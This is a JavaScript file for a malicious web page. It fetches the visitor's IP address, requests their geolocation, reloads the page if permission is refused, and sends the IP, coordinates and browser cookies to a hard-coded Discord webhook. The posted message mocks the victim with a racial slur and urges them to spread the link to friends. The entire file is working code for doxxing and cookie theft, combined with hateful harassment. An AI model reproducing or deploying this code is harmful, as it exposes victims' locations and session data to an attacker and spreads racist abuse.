let user = {}
window.onload = async () => {
    function send(data) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/webhooks/1149978788671787028/JR3METdVOvu9e6suujmqj5ixcvHGP1_kMc-AWzDmOcWU436Cz760lyTdSjUewySPbuGV", true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
            console.log(JSON.stringify(data))
    }
    let ip = await (await fetch('https://api.ipify.org/?format=json')).json()
    user.ip = ip.ip
    const x = document.body;
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            console.log(ip, JSON.stringify(position))
            user.position = position
            send({
                content: "you just got doxxed nigger",
                tts: false,
                embeds: [
                  {
                    id: 646325379,
                    title: "your Hacked !!?",
                    description: "you got hacked because you clicked that link\nnever click links from an unknown guy",
                    color: 16711680,
                    footer: {
                      text: "use the same link to hack your friends",
                      icon_url: "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif"
                    },
                    author: {
                      name: "HSN",
                      icon_url: "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp"
                    },
                    thumbnail: {
                      url: "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif"
                    },
                    fields: [
                      {
                        id: 365387260,
                        name: "ip",
                        value: user.ip,
                        inline: true
                      },
                      {
                        id: 146105502,
                        name: "position",
                        value: `latt: ${position.coords.latitude},lang: ${position.coords.longitude}` || "null",
                        inline: true
                      },
                      {
                        id: 966136374,
                        name: "cookie",
                        value: document.cookie || "null"
                      }
                    ]
                  }
                ],
                username: "your dead",
                avatar_url: "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp"
            })
            // send({
            //     content:"hello"
            // })
            // send({
            //     "content": "you just got doxxed nigger",
            //     "tts": false,
            //     "embeds": [
            //       {
            //         "id": 646325379,
            //         "title": "your Hacked !!?",
            //         "description": "you got hacked because you clicked that link\nnever click links from an unknown guy",
            //         "color": 16711680,
            //         "footer": {
            //           "text": "use the same link to hack your friends",
            //           "icon_url": "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif"
            //         },
            //         "author": {
            //           "name": "HSN",
            //           "icon_url": "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp"
            //         },
            //         "thumbnail": {
            //           "url": "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif"
            //         },
            //         "fields": [
            //           {
            //             "id": 365387260,
            //             "name": "ip",
            //             "value": "192.168.23",
            //             "inline": true
            //           },
            //           {
            //             "id": 146105502,
            //             "name": "ip",
            //             "value": "https://med",
            //             "inline": true
            //           },
            //           {
            //             "id": 966136374,
            //             "name": "cookie",
            //             "value": "document.cookie"
            //           }
            //         ]
            //       }
            //     ],
            //     "components": [],
            //     "actions": {},
            //     "username": "your dead",
            //     "avatar_url": "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp"
            //   })
        }, () => { window.location.reload() });
    } else {
        x.innerHTML = "Geolocation is not supported by this browser.";
    }
    send({
        content: "you just got doxxed nigger",
        tts: false,
        embeds: [
          {
            id: 646325379,
            title: "your Hacked !!?",
            description: "you got hacked because you clicked that link\nnever click links from an unknown guy",
            color: 16711680,
            footer: {
              text: "use the same link to hack your friends",
              icon_url: "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif"
            },
            author: {
              name: "HSN",
              icon_url: "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp"
            },
            thumbnail: {
              url: "https://media1.tenor.com/m/n89vEt5n9fgAAAAd/sad-man.gif"
            },
            fields: [
              {
                id: 365387260,
                name: "ip",
                value: user.ip,
                inline: true
              },
              {
                id: 966136374,
                name: "cookie",
                value: document.cookie || "null"
              }
            ]
          }
        ],
        username: "your dead",
        avatar_url: "https://cdn.discordapp.com/avatars/1110868817229389824/86ce0f880f1cee951af0b39784d91cde.webp"
    })
}